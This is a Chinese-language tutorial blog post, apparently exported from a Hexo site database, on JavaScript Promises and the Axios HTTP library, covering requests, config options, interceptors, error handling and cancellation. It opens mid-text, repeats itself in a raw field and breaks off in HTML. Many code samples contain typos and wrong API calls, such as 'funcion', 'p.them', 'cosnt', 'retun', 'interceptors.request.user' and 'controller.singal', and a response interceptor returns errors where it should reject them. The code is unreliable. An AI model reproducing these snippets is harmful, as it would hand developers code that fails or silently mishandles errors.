5.all的用法\n\n谁跑得慢，以谁为准执行回调；all接受一个数组参数，里面的值最终都算返回Promise对象；\n\nall方法提供了并行执行异步操作的能力，并且在所有异步操作执行完成之后才执行回调；\n\n```js\nlet Promose1=new Promise(function(resolve,reject){})\nlet Promise2=new Promise(function(resolve,reject){})\nlet Promise3=new Promise(function(resolve,reject){})\n\nlet p=Promise.all([Promise1,Promise2,Promise3])\n\np.then(function(){\n   \tconsole.log(\"三个都执行成功则成功\")\n},function(){\n    console.log(\"只要有失败则失败\")\n})\n```\n\n使用场景：一个游戏需要很多素材，只有所有素材都下载到本地之后，才开始初始化；\n\n```js\nlet video=new Promise(funcion(resolve,reject){});\nlet word=new Promise(function(resolve,reject){});\n\nlet p=Promise.all([video,word]);\n\np.them(funcion(){\n       console.log(\"开始初始化！\");\n       },function(){\n           console.log(\"游戏初始化失败\")；\n       })\n```\n\n#### 6.race用法\n\n谁跑的块，以谁为准执行回调；\n\n可以用race给某个异步请求设置超时时间，并且在超时后执行相应的操作，代码如下：\n\n```js\nfunction requestImg(){\n\tvar p = new Promise((resolve,reject)=>{\n        var img =new Img();\n        img.onload=function(){\n            resolve(img);\n        }\n        img.src='img path';\n    });\n    return p;\n}\n\n//延时函数，用于计时\nfunction timeout(){\n    var p=new Promise((resolve,reject)=>{\n        setTimeout(()=>{\n            reject(\"请求图片超时！\");\n        },5000);\n    });\n    return p;\n}\n//调用\nPromise.race([requestImg(), timeout()]).then((data) =>{\n    console.log(data);\n}).catch((err) => {\n    console.log(err);\n});\n```\n\n### 二、基础定义Axios\n\n#### 服务端它使用原生 node.js `http` 模块, 而在客户端 (浏览端) 则使用 XMLHttpRequests。\n\n#### 1.特性\n\n- 从浏览器创建 [XMLHttpRequests](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)\n- 从 node.js 创建 [http](http://nodejs.org/api/http.html) 请求\n- 支持 [Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise) API\n- 拦截请求和响应\n- 转换请求和响应数据\n- 取消请求\n- 自动转换JSON数据\n- 客户端支持防御[XSRF](http://en.wikipedia.org/wiki/Cross-site_request_forgery)\n\n#### 2.安装使用\n\n```shell\nnpm install axios\n//yarn\n yarn add axios\n```\n\n#### Get请求\n\n```js\nconst axios=require('axios');\n\n//向给定的ID用户发起请求\naxios.get('/user?ID=12345').then(function(response){\n    console.log(\"成功！\")\n}).catch(function(err){\n    console.log(\"失败\");\n}).then(function(){\n    console.log(\"总是执行的部分\");\n})\n\n//以上代码可以等价于\naxios.get('/user',{\n    params:{\n        ID:12345\n    }\n}).then(function(response){\n    console.log(\"成功！\")\n}).catch(function(err){\n    console.log(\"失败\");\n}).then(function(){\n    console.log(\"总是执行的部分\");\n})\n\n```\n\n#### POST请求\n\n```js\naxios.post('/user',{\n    fiestName:'Fred',\n    lastName:'Smith'\n}).then(function(response){\n    console.log(response);\n}).catch(function(err){\n    console.log(err);\n});\n\n//多个POST请求\nfunction getUserAccount(){\n    return axios.get('/user/12345');\n}\n\nfunction getUserPermissions(){\n    return axios.get('/user/12345/permissions');\n}\n\nPromise.all([getUserAccount(),getUserPermissions()]).then(function(results){\n    const acct=results[0];\n    const perm=results[1];\n})\n```\n\n#### 3.Axops API\n\n可以向 `axios` 传递相关配置来创建请求\n\n```js\n//发起一个post请求\naxios({\n\tmethod:'post',\n    url:'/user/12345',\n    data:{\n        firstname:'Martin',\n        lastname:'Smith'\n    }\n});\n```\n\n```js\n//在nodeJS用GET请求远程图片\naxios({\n    method:'get',\n    url:'http://test/123',\n    responseType:'stream'\n}).then((response)=>{\n    response.data.pipe(fs.createWriteStream('test.jpg'));\n});\n```\n\n#### 4.请求配置\n\n创建请求时可以用配置选项；只有url是必须的，如果没有指定method，则默认使用GET；\n\n```json\n{\n    url:'/api/user',          //用于请求的服务器URL\n    method:'get',\n    baseUrl:'https://192.168.0.1:35000',\t\t//自动加在url前；\n    transformRequest:[\n        function(data,headers){\n            //对即将发送的data进行处理；\n            return processedData;\n        }\n    ],\n    transformResponse:[\n        function(response){\n            //对收到的响应进行处理；\n            return processedResponse;\n        }\n    ],\n    headers:{'X-Requested-With': 'XMLHttpRequest'},\n    params:{\n        ID:12345\t\t//与请求一起发送的url参数；\n    }，\n    //data是作为请求体被发送的数据，仅适用于PUT，POST，DELETE和PATCH方法；\n    // 在没有设置 `transformRequest` 时，则必须是以下类型之一:\n  \t// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams\n  \t// - 浏览器专属: FormData, File, Blob\n  \t// - Node 专属: Stream, Buffer\n    data:{\n    firstname:'Fred',\n\t},\n      // 发送请求体数据的可选语法\n      // 请求方式 post\n      // 只有 value 会被发送，key 则不会\n      data: 'Country=Brasil&City=Belo Horizonte',\n\n\t//timeout:指定请求超时的毫秒数；默认0ms；\n\ttimeout:1000,  \n\t\n\t//跨域时是否需要凭证；\n\twithCredentials:false,\n  // `adapter` 允许自定义处理请求，这使测试更加容易。\n  // 返回一个 promise 并提供一个有效的响应 （参见 lib/adapters/README.md）。\n  adapter: function (config) {\n    /* ... */\n  },\n\n  // `auth` HTTP Basic Auth\n  auth: {\n    username: 'janedoe',\n    password: 's00pers3cret'\n  },\n\n  // `responseType` 表示浏览器将要响应的数据类型\n  // 选项包括: 'arraybuffer', 'document', 'json', 'text', 'stream'\n  // 浏览器专属：'blob'\n  responseType: 'json', // 默认值\n\n  // `responseEncoding` 表示用于解码响应的编码 (Node.js 专属)\n  // 注意：忽略 `responseType` 的值为 'stream'，或者是客户端请求\n  // Note: Ignored for `responseType` of 'stream' or client-side requests\n  responseEncoding: 'utf8', // 默认值\n\n  // `xsrfCookieName` 是 xsrf token 的值，被用作 cookie 的名称\n  xsrfCookieName: 'XSRF-TOKEN', // 默认值\n\n  // `xsrfHeaderName` 是带有 xsrf token 值的http 请求头名称\n  xsrfHeaderName: 'X-XSRF-TOKEN', // 默认值\n\n  // `onUploadProgress` 允许为上传处理进度事件\n  // 浏览器专属\n  onUploadProgress: function (progressEvent) {\n    // 处理原生进度事件\n  },\n\n  // `onDownloadProgress` 允许为下载处理进度事件\n  // 浏览器专属\n  onDownloadProgress: function (progressEvent) {\n    // 处理原生进度事件\n  },\n\n  // `maxContentLength` 定义了node.js中允许的HTTP响应内容的最大字节数\n  maxContentLength: 2000,\n\n  // `maxBodyLength`（仅Node）定义允许的http请求内容的最大字节数\n  maxBodyLength: 2000,\n\n  // `validateStatus` 定义了对于给定的 HTTP状态码是 resolve 还是 reject promise。\n  // 如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，\n  // 则promise 将会 resolved，否则是 rejected。\n  validateStatus: function (status) {\n    return status >= 200 && status < 300; // 默认值\n  },\n\n  // `maxRedirects` 定义了在node.js中要遵循的最大重定向数。\n  // 如果设置为0，则不会进行重定向\n  maxRedirects: 5, // 默认值\n\n  // `socketPath` 定义了在node.js中使用的UNIX套接字。\n  // e.g. '/var/run/docker.sock' 发送请求到 docker 守护进程。\n  // 只能指定 `socketPath` 或 `proxy` 。\n  // 若都指定，这使用 `socketPath` 。\n  socketPath: null, // default\n\n  // `httpAgent` and `httpsAgent` define a custom agent to be used when performing http\n  // and https requests, respectively, in node.js. This allows options to be added like\n  // `keepAlive` that are not enabled by default.\n  httpAgent: new http.Agent({ keepAlive: true }),\n  httpsAgent: new https.Agent({ keepAlive: true }),\n\n  // `proxy` 定义了代理服务器的主机名，端口和协议。\n  // 您可以使用常规的`http_proxy` 和 `https_proxy` 环境变量。\n  // 使用 `false` 可以禁用代理功能，同时环境变量也会被忽略。\n  // `auth`表示应使用HTTP Basic auth连接到代理，并且提供凭据。\n  // 这将设置一个 `Proxy-Authorization` 请求头，它会覆盖 `headers` 中已存在的自定义 `Proxy-Authorization` 请求头。\n  // 如果代理服务器使用 HTTPS，则必须设置 protocol 为`https`\n  proxy: {\n    protocol: 'https',\n    host: '127.0.0.1',\n    port: 9000,\n    auth: {\n      username: 'mikeymike',\n      password: 'rapunz3l'\n    }\n  },\n\n  // see https://axios-http.com/zh/docs/cancellation\n  cancelToken: new CancelToken(function (cancel) {\n  }),\n\n  // `decompress` indicates whether or not the response body should be decompressed \n  // automatically. If set to `true` will also remove the 'content-encoding' header \n  // from the responses objects of all decompressed responses\n  // - Node only (XHR cannot turn off decompression)\n  decompress: true // 默认值\n}\n\n```\n\n#### 5.响应结构\n\n```json\n{\n\t//data为服务器响应\n    data:{},\n    \n    //状态码\n    status:200,\n    \n    //HTTP状态信息\n    statusText:'OK',\n    \n    //服务器响应头\n    headers:{},\n    //axios请求的配置信息；\n    config:{},\n    //生成响应的请求\n    // 在node.js中它是最后一个ClientRequest实例 (in redirects)，\n  \t// 在浏览器中则是 XMLHttpRequest 实例\n    request:{},\n}\n```\n\n\n\n### 三、默认配置\n\n#### 1.全局axios默认值\n\n```js\naxios.defaults.baseURL = 'https://api.example.com';\naxios.defaults.headers.common['Authorization'] = AUTH_TOKEN;\naxios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';\n```\n\n#### 2.自定义实例默认值\n\n```js\n// 创建实例时配置默认值\nconst instance = axios.create({\n  baseURL: 'https://api.example.com'\n});\n\n// 创建实例后修改默认值\ninstance.defaults.headers.common['Authorization'] = AUTH_TOKEN;\n```\n\n#### 3.配置的优先级\n\n```js\n//此时默认超时时间为0\nconst instance=axios.create();\n\n//重写库的超时默认值\ninstance.defaults,timeout=2500;\n\n//重写超时时间\ninstance.get('/logout',{\n    timeout:5000\n});\n```\n\n#### 4.拦截器\n\n请求或者响应被then或者catch处理之前拦截\n\n```js\n//添加请求拦截器\naxios.interceptors.request.user(function(config){\n    //发送请求前做点啥~\n    return config;\n},function(error){\n    //对发送中的错误做点啥~\n    return Promise.reject(error);\n});\n\n//添加响应拦截器\naxios.interceptors.response.user(function(response){\n    //2xx范围内的状态码都会触发此函数哦~\n    //do something.\n    return response;\n},function(error){\n    //2xx以外的状态码都会触发此函数哦~\n    //do something.\n    return error;\n});\n```\n\n##### 移除拦截器\n\n```js\nconst interceptor=axios.interceptors.request.user(function(){\n\n});\naxios.interceptors.request.eject(interceptor);\n```\n\n##### 添加拦截器\n\n```js\nconst instance = axios.create();\ninstance.interceptors.request.use(function () {/*...*/});\n```\n\n#### 5.错误处理\n\n```js\naxios.get('/user/12345').catch(function(error){\n    if(error.response){\n        //请求成功发出且服务器响应了状态码，但是状态码超出了2xx\n        console.log(error.response.data);\n    }else if(error.request){\n        //请求已经发起成功，但是没有收到响应；\n        //error.request是浏览器中XMLHttpRequest的实例；\n        console.log(error.request);\n    }else{\n        //请求发出时出问题\n        console.log('Error:',error.message);\n    }\n    console.log(error.coonfig);\n})\n```\n\n##### 使用validataStatus配置选项，可以自定义抛出错误HttpCode;\n\n```js\naxios.get('/user/12345',{\n    validateStatus:function(status){\n        return status>500;\n    }\n})\n```\n\n##### 使用 `toJSON` 可以获取更多关于HTTP错误的信息。\n\n```js\naxios.get('/user/12345')\n  .catch(function (error) {\n    console.log(error.toJSON());\n  });\n```\n\n#### 6.取消请求\n\n##### fetechAPI  AbortController取消请求\n\n```js\nconst comtrollor=new AbortController();\n\naxios.get('/foo/bar',{\n    signal:controller.singal\n}).then(function(response){\n    \n});\n\ncontrollor.abort();\n```\n\n##### CancelToken deprecated(已弃用)\n\n#### 7.请求体编码\n\n默认情况下，axios将js对象序列化为json；\n\n以`application/x-www-form-urlencoded`格式发送数据；\n\n##### 浏览器\n\n```js\nconst params=new URLSearchParams();\nparams.append('param1','value1');\nparams.append('params2','value2');\naxios.post('/foo',params);\n\n//注意，并不是所有的浏览器都支持URLResearchParams\n\n//qs库编码数据\nconst qs=require('qs');\naxios.post('/foo',qs.stringify({\n    'bar':123\n}));\n\n或者ES6方法\n\nimport qs from 'qs';\ncosnt data={\n    'bar':123\n};\n\nconst options={\n    method:'POST',\n    headers:{ 'content-type': 'application/x-www-form-urlencoded' },\n    data:qs.stringify(data),\n    url,\n};\naxios(options);\n```\n\n##### NodeJS 使用querystring\n\n```js\n\nconst querystring = require('querystring');\naxios.post('http://something.com/', querystring.stringify({ foo: 'bar' }));\n\nconst url = require('url');\nconst params = new url.URLSearchParams({ foo: 'bar' });\naxios.post('http://something.com/', params.toString());\n\n//如果需要对嵌套对象进行字符串化处理，则最好使用 qs 库，因为 querystring 方法在该用例中存在已知问题\n```\n\nForm Data\n\n```js\nconst FormData=require('form-data');\n\nconst form =new FormData();\nform.append('filed1','value1');\n\naxios.post('https://example.com',form,{headers:from.getHeaders()})\n```\n\n拦截器\n\n```js\naxios.interceptors.request.use(config=>{\n    if(config.data instanceof FormData){\n        Object.assign(config.headers,config.data.getHeaders());\n    }\n    retun config;\n})\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/Axios详解.md","raw":"---\ntitle: Axios详解\ndate: 2022-10-27 16:09:00\ncategories: \n    - JS\ntags: \n    - JS\nmp3: \ncover: img/axios.png\n---\n\n# Axios\n\n#### 基于promise可以用于浏览器和node.js的网络请求库\n\n### 一、基础定义Promise\n\n#### 1.promise\n\n一个对象，用于传递异步操作的消息；本意上可以理解为，承诺过一段时间返回一个结果。\n\n```visual basic\n 其实就是一个请求发出去以后，并不能马上获得需要的数据，因此整个js代码需要暂停等待请求数据的返回\n```\n\nPromise有三种状态：pending(等待态)，fulfiled(成功态)，rejected（失败态）；状态一旦改变就不会再变；创造promise实例后会立即执行；\n\n```js\n\n// 当参数a大于10且参数fn2是一个方法时 执行fn2\nfunction fn1(a, fn2) {\n    if (a > 10 && typeof fn2 == 'function') {\n        fn2()\n    }\n}\nfn1(11, function() {\n    console.log('this is a callback')\n})\n```\n\n一般来说我们会碰到的回调嵌套都不会很多，一般就一到两级，但是某些情况下，回调嵌套很多时，代码就会非常繁琐，会给我们的编程带来很多的麻烦，这种情况俗称——回调地狱。\n\n这时候我们的promise就应运而生、粉墨登场了\n\npromise主要解决两个问题：\n\n1. 回调地狱，代码难以维护，常常第一个函数的输出是第二个函数的输入；\n\n2. 支持多个并发请求，并从请求中获取数据；可以解决异步的问题；\n\n   ```visual basic\n   建议使用ES6箭头函数的编码方式，获得数据，处理数据，处理完成，下一步~\n   ```\n\n   \n\n#### 2.promise用法\n\n```js\nlet p=new Promise((resolve,reject)=>{\n    //一些异步操作\n    setTimeout(()=>{\n        console.log(\"Finished.\");\n        resolve(\"成功！\")；\n    }，2000)\n})\n\n//promise的构造函数接受一个函数类型的参数，并且需要传入两个参数：\nresolve：异步操作执行成功之后的回调函数；\nreject：异步操作执行失败后的回调函数；\n```\n\nthen 链式操作：\n\n表面上，promise只是简化层层回调，实质上，用维护状态、传递状态的方法使得回调函数能够及时调用；\n\n正确场景：\n\n```javascript\np.then((data))=>{\n    cosnsole.log(data);\n}).then((data)=>{\n    console.log(data);\n}).then((data)=>P{\n        console.log(data);\n        });\n```\n\n#### 3.reject用法\n\n把promise的状态设置为rejected，这样在then中就能捕捉到，然后执行“失败”情况的回调；\n\n```js\nlet p=new Promise((resolve,reject)=>{\n    setTimeout(function(){\n        var num=Math.ceil(Math.random()*10);\n        if(num<=5)\n            {\n                resolve(num);\n            }else\n                {\n                    reject(\"数字太大！\")；\n                }\n    },2000);\n})；\np.then((data)=>{\n    console.log(\"Resolved\",data);\n},(err)=>{\n    console.log(\"Rejected\",err);\n}\n      )\n```\n\n#### 4.catch用法\n\ncatch和then的第二个参数一样用来指定reject的回调；\n\n```js\np.then((data)=>{\n    console.log(\"Resolved\",data);\n}).catch((err)=>{\n    console.log(\"Rejected\",err);\t\t\t//抛出异常\n})\n//如果执行resolve的回调时，如果抛出异常，并不会报错停止js，而是进入到catch方法；\np.then((data) => {\n    console.log('resolved',data);\n    console.log(somedata); //此处的somedata未定义\n})\n.catch((err) => {\n    console.log('rejected',err);\n});\n```\n\n#### 5.all的用法\n\n谁跑得慢，以谁为准执行回调；all接受一个数组参数，里面的值最终都算返回Promise对象；\n\nall方法提供了并行执行异步操作的能力，并且在所有异步操作执行完成之后才执行回调；\n\n```js\nlet Promose1=new Promise(function(resolve,reject){})\nlet Promise2=new Promise(function(resolve,reject){})\nlet Promise3=new Promise(function(resolve,reject){})\n\nlet p=Promise.all([Promise1,Promise2,Promise3])\n\np.then(function(){\n   \tconsole.log(\"三个都执行成功则成功\")\n},function(){\n    console.log(\"只要有失败则失败\")\n})\n```\n\n使用场景：一个游戏需要很多素材，只有所有素材都下载到本地之后，才开始初始化；\n\n```js\nlet video=new Promise(funcion(resolve,reject){});\nlet word=new Promise(function(resolve,reject){});\n\nlet p=Promise.all([video,word]);\n\np.them(funcion(){\n       console.log(\"开始初始化！\");\n       },function(){\n           console.log(\"游戏初始化失败\")；\n       })\n```\n\n#### 6.race用法\n\n谁跑的块，以谁为准执行回调；\n\n可以用race给某个异步请求设置超时时间，并且在超时后执行相应的操作，代码如下：\n\n```js\nfunction requestImg(){\n\tvar p = new Promise((resolve,reject)=>{\n        var img =new Img();\n        img.onload=function(){\n            resolve(img);\n        }\n        img.src='img path';\n    });\n    return p;\n}\n\n//延时函数，用于计时\nfunction timeout(){\n    var p=new Promise((resolve,reject)=>{\n        setTimeout(()=>{\n            reject(\"请求图片超时！\");\n        },5000);\n    });\n    return p;\n}\n//调用\nPromise.race([requestImg(), timeout()]).then((data) =>{\n    console.log(data);\n}).catch((err) => {\n    console.log(err);\n});\n```\n\n### 二、基础定义Axios\n\n#### 服务端它使用原生 node.js `http` 模块, 而在客户端 (浏览端) 则使用 XMLHttpRequests。\n\n#### 1.特性\n\n- 从浏览器创建 [XMLHttpRequests](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)\n- 从 node.js 创建 [http](http://nodejs.org/api/http.html) 请求\n- 支持 [Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise) API\n- 拦截请求和响应\n- 转换请求和响应数据\n- 取消请求\n- 自动转换JSON数据\n- 客户端支持防御[XSRF](http://en.wikipedia.org/wiki/Cross-site_request_forgery)\n\n#### 2.安装使用\n\n```shell\nnpm install axios\n//yarn\n yarn add axios\n```\n\n#### Get请求\n\n```js\nconst axios=require('axios');\n\n//向给定的ID用户发起请求\naxios.get('/user?ID=12345').then(function(response){\n    console.log(\"成功！\")\n}).catch(function(err){\n    console.log(\"失败\");\n}).then(function(){\n    console.log(\"总是执行的部分\");\n})\n\n//以上代码可以等价于\naxios.get('/user',{\n    params:{\n        ID:12345\n    }\n}).then(function(response){\n    console.log(\"成功！\")\n}).catch(function(err){\n    console.log(\"失败\");\n}).then(function(){\n    console.log(\"总是执行的部分\");\n})\n\n```\n\n#### POST请求\n\n```js\naxios.post('/user',{\n    fiestName:'Fred',\n    lastName:'Smith'\n}).then(function(response){\n    console.log(response);\n}).catch(function(err){\n    console.log(err);\n});\n\n//多个POST请求\nfunction getUserAccount(){\n    return axios.get('/user/12345');\n}\n\nfunction getUserPermissions(){\n    return axios.get('/user/12345/permissions');\n}\n\nPromise.all([getUserAccount(),getUserPermissions()]).then(function(results){\n    const acct=results[0];\n    const perm=results[1];\n})\n```\n\n#### 3.Axops API\n\n可以向 `axios` 传递相关配置来创建请求\n\n```js\n//发起一个post请求\naxios({\n\tmethod:'post',\n    url:'/user/12345',\n    data:{\n        firstname:'Martin',\n        lastname:'Smith'\n    }\n});\n```\n\n```js\n//在nodeJS用GET请求远程图片\naxios({\n    method:'get',\n    url:'http://test/123',\n    responseType:'stream'\n}).then((response)=>{\n    response.data.pipe(fs.createWriteStream('test.jpg'));\n});\n```\n\n#### 4.请求配置\n\n创建请求时可以用配置选项；只有url是必须的，如果没有指定method，则默认使用GET；\n\n```json\n{\n    url:'/api/user',          //用于请求的服务器URL\n    method:'get',\n    baseUrl:'https://192.168.0.1:35000',\t\t//自动加在url前；\n    transformRequest:[\n        function(data,headers){\n            //对即将发送的data进行处理；\n            return processedData;\n        }\n    ],\n    transformResponse:[\n        function(response){\n            //对收到的响应进行处理；\n            return processedResponse;\n        }\n    ],\n    headers:{'X-Requested-With': 'XMLHttpRequest'},\n    params:{\n        ID:12345\t\t//与请求一起发送的url参数；\n    }，\n    //data是作为请求体被发送的数据，仅适用于PUT，POST，DELETE和PATCH方法；\n    // 在没有设置 `transformRequest` 时，则必须是以下类型之一:\n  \t// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams\n  \t// - 浏览器专属: FormData, File, Blob\n  \t// - Node 专属: Stream, Buffer\n    data:{\n    firstname:'Fred',\n\t},\n      // 发送请求体数据的可选语法\n      // 请求方式 post\n      // 只有 value 会被发送，key 则不会\n      data: 'Country=Brasil&City=Belo Horizonte',\n\n\t//timeout:指定请求超时的毫秒数；默认0ms；\n\ttimeout:1000,  \n\t\n\t//跨域时是否需要凭证；\n\twithCredentials:false,\n  // `adapter` 允许自定义处理请求，这使测试更加容易。\n  // 返回一个 promise 并提供一个有效的响应 （参见 lib/adapters/README.md）。\n  adapter: function (config) {\n    /* ... */\n  },\n\n  // `auth` HTTP Basic Auth\n  auth: {\n    username: 'janedoe',\n    password: 's00pers3cret'\n  },\n\n  // `responseType` 表示浏览器将要响应的数据类型\n  // 选项包括: 'arraybuffer', 'document', 'json', 'text', 'stream'\n  // 浏览器专属：'blob'\n  responseType: 'json', // 默认值\n\n  // `responseEncoding` 表示用于解码响应的编码 (Node.js 专属)\n  // 注意：忽略 `responseType` 的值为 'stream'，或者是客户端请求\n  // Note: Ignored for `responseType` of 'stream' or client-side requests\n  responseEncoding: 'utf8', // 默认值\n\n  // `xsrfCookieName` 是 xsrf token 的值，被用作 cookie 的名称\n  xsrfCookieName: 'XSRF-TOKEN', // 默认值\n\n  // `xsrfHeaderName` 是带有 xsrf token 值的http 请求头名称\n  xsrfHeaderName: 'X-XSRF-TOKEN', // 默认值\n\n  // `onUploadProgress` 允许为上传处理进度事件\n  // 浏览器专属\n  onUploadProgress: function (progressEvent) {\n    // 处理原生进度事件\n  },\n\n  // `onDownloadProgress` 允许为下载处理进度事件\n  // 浏览器专属\n  onDownloadProgress: function (progressEvent) {\n    // 处理原生进度事件\n  },\n\n  // `maxContentLength` 定义了node.js中允许的HTTP响应内容的最大字节数\n  maxContentLength: 2000,\n\n  // `maxBodyLength`（仅Node）定义允许的http请求内容的最大字节数\n  maxBodyLength: 2000,\n\n  // `validateStatus` 定义了对于给定的 HTTP状态码是 resolve 还是 reject promise。\n  // 如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，\n  // 则promise 将会 resolved，否则是 rejected。\n  validateStatus: function (status) {\n    return status >= 200 && status < 300; // 默认值\n  },\n\n  // `maxRedirects` 定义了在node.js中要遵循的最大重定向数。\n  // 如果设置为0，则不会进行重定向\n  maxRedirects: 5, // 默认值\n\n  // `socketPath` 定义了在node.js中使用的UNIX套接字。\n  // e.g. '/var/run/docker.sock' 发送请求到 docker 守护进程。\n  // 只能指定 `socketPath` 或 `proxy` 。\n  // 若都指定，这使用 `socketPath` 。\n  socketPath: null, // default\n\n  // `httpAgent` and `httpsAgent` define a custom agent to be used when performing http\n  // and https requests, respectively, in node.js. This allows options to be added like\n  // `keepAlive` that are not enabled by default.\n  httpAgent: new http.Agent({ keepAlive: true }),\n  httpsAgent: new https.Agent({ keepAlive: true }),\n\n  // `proxy` 定义了代理服务器的主机名，端口和协议。\n  // 您可以使用常规的`http_proxy` 和 `https_proxy` 环境变量。\n  // 使用 `false` 可以禁用代理功能，同时环境变量也会被忽略。\n  // `auth`表示应使用HTTP Basic auth连接到代理，并且提供凭据。\n  // 这将设置一个 `Proxy-Authorization` 请求头，它会覆盖 `headers` 中已存在的自定义 `Proxy-Authorization` 请求头。\n  // 如果代理服务器使用 HTTPS，则必须设置 protocol 为`https`\n  proxy: {\n    protocol: 'https',\n    host: '127.0.0.1',\n    port: 9000,\n    auth: {\n      username: 'mikeymike',\n      password: 'rapunz3l'\n    }\n  },\n\n  // see https://axios-http.com/zh/docs/cancellation\n  cancelToken: new CancelToken(function (cancel) {\n  }),\n\n  // `decompress` indicates whether or not the response body should be decompressed \n  // automatically. If set to `true` will also remove the 'content-encoding' header \n  // from the responses objects of all decompressed responses\n  // - Node only (XHR cannot turn off decompression)\n  decompress: true // 默认值\n}\n\n```\n\n#### 5.响应结构\n\n```json\n{\n\t//data为服务器响应\n    data:{},\n    \n    //状态码\n    status:200,\n    \n    //HTTP状态信息\n    statusText:'OK',\n    \n    //服务器响应头\n    headers:{},\n    //axios请求的配置信息；\n    config:{},\n    //生成响应的请求\n    // 在node.js中它是最后一个ClientRequest实例 (in redirects)，\n  \t// 在浏览器中则是 XMLHttpRequest 实例\n    request:{},\n}\n```\n\n\n\n### 三、默认配置\n\n#### 1.全局axios默认值\n\n```js\naxios.defaults.baseURL = 'https://api.example.com';\naxios.defaults.headers.common['Authorization'] = AUTH_TOKEN;\naxios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';\n```\n\n#### 2.自定义实例默认值\n\n```js\n// 创建实例时配置默认值\nconst instance = axios.create({\n  baseURL: 'https://api.example.com'\n});\n\n// 创建实例后修改默认值\ninstance.defaults.headers.common['Authorization'] = AUTH_TOKEN;\n```\n\n#### 3.配置的优先级\n\n```js\n//此时默认超时时间为0\nconst instance=axios.create();\n\n//重写库的超时默认值\ninstance.defaults,timeout=2500;\n\n//重写超时时间\ninstance.get('/logout',{\n    timeout:5000\n});\n```\n\n#### 4.拦截器\n\n请求或者响应被then或者catch处理之前拦截\n\n```js\n//添加请求拦截器\naxios.interceptors.request.user(function(config){\n    //发送请求前做点啥~\n    return config;\n},function(error){\n    //对发送中的错误做点啥~\n    return Promise.reject(error);\n});\n\n//添加响应拦截器\naxios.interceptors.response.user(function(response){\n    //2xx范围内的状态码都会触发此函数哦~\n    //do something.\n    return response;\n},function(error){\n    //2xx以外的状态码都会触发此函数哦~\n    //do something.\n    return error;\n});\n```\n\n##### 移除拦截器\n\n```js\nconst interceptor=axios.interceptors.request.user(function(){\n\n});\naxios.interceptors.request.eject(interceptor);\n```\n\n##### 添加拦截器\n\n```js\nconst instance = axios.create();\ninstance.interceptors.request.use(function () {/*...*/});\n```\n\n#### 5.错误处理\n\n```js\naxios.get('/user/12345').catch(function(error){\n    if(error.response){\n        //请求成功发出且服务器响应了状态码，但是状态码超出了2xx\n        console.log(error.response.data);\n    }else if(error.request){\n        //请求已经发起成功，但是没有收到响应；\n        //error.request是浏览器中XMLHttpRequest的实例；\n        console.log(error.request);\n    }else{\n        //请求发出时出问题\n        console.log('Error:',error.message);\n    }\n    console.log(error.coonfig);\n})\n```\n\n##### 使用validataStatus配置选项，可以自定义抛出错误HttpCode;\n\n```js\naxios.get('/user/12345',{\n    validateStatus:function(status){\n        return status>500;\n    }\n})\n```\n\n##### 使用 `toJSON` 可以获取更多关于HTTP错误的信息。\n\n```js\naxios.get('/user/12345')\n  .catch(function (error) {\n    console.log(error.toJSON());\n  });\n```\n\n#### 6.取消请求\n\n##### fetechAPI  AbortController取消请求\n\n```js\nconst comtrollor=new AbortController();\n\naxios.get('/foo/bar',{\n    signal:controller.singal\n}).then(function(response){\n    \n});\n\ncontrollor.abort();\n```\n\n##### CancelToken deprecated(已弃用)\n\n#### 7.请求体编码\n\n默认情况下，axios将js对象序列化为json；\n\n以`application/x-www-form-urlencoded`格式发送数据；\n\n##### 浏览器\n\n```js\nconst params=new URLSearchParams();\nparams.append('param1','value1');\nparams.append('params2','value2');\naxios.post('/foo',params);\n\n//注意，并不是所有的浏览器都支持URLResearchParams\n\n//qs库编码数据\nconst qs=require('qs');\naxios.post('/foo',qs.stringify({\n    'bar':123\n}));\n\n或者ES6方法\n\nimport qs from 'qs';\ncosnt data={\n    'bar':123\n};\n\nconst options={\n    method:'POST',\n    headers:{ 'content-type': 'application/x-www-form-urlencoded' },\n    data:qs.stringify(data),\n    url,\n};\naxios(options);\n```\n\n##### NodeJS 使用querystring\n\n```js\n\nconst querystring = require('querystring');\naxios.post('http://something.com/', querystring.stringify({ foo: 'bar' }));\n\nconst url = require('url');\nconst params = new url.URLSearchParams({ foo: 'bar' });\naxios.post('http://something.com/', params.toString());\n\n//如果需要对嵌套对象进行字符串化处理，则最好使用 qs 库，因为 querystring 方法在该用例中存在已知问题\n```\n\nForm Data\n\n```js\nconst FormData=require('form-data');\n\nconst form =new FormData();\nform.append('filed1','value1');\n\naxios.post('https://example.com',form,{headers:from.getHeaders()})\n```\n\n拦截器\n\n```js\naxios.interceptors.request.use(config=>{\n    if(config.data instanceof FormData){\n        Object.assign(config.headers,config.data.getHeaders());\n    }\n    retun config;\n})\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Axios详解","published":1,"updated":"2022-10-27T08:11:25.944Z","_id":"clg29vyh6003iao9c7zex4hu2","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Axios\"><a href=\"#Axios\" class=\"headerlink\" title=\"Axios\"></a>Axios</h1><h4 id=\"基于promise可以用于浏览器和node-js的网络请求库\"><a href=\"#基于promise可以用于浏览器和node-js的网络请求库\" class=\"headerlink\" title=\"基于promise可以用于浏览器和node.js的网络请求库\"></a>基于promise可以用于浏览器和node.js的网络请求库</h4><h3 id=\"一、基础定义Promise\"><a href=\"#一、基础定义Promise\" class=\"headerlink\" title=\"一、基础定义Promise\"></a>一、基础定义Promise</h3><h4 id=\"1-promise\"><a href=\"#1-promise\" class=\"headerlink\" title=\"1.promise\"></a>1.promise</h4><p>一个对象，用于传递异步操作的消息；本意上可以理解为，承诺过一段时间返回一个结果。</p>\n<figure class=\"highlight plaintext\"><figcaption><span>basic</span></figcaption><table><tr><td 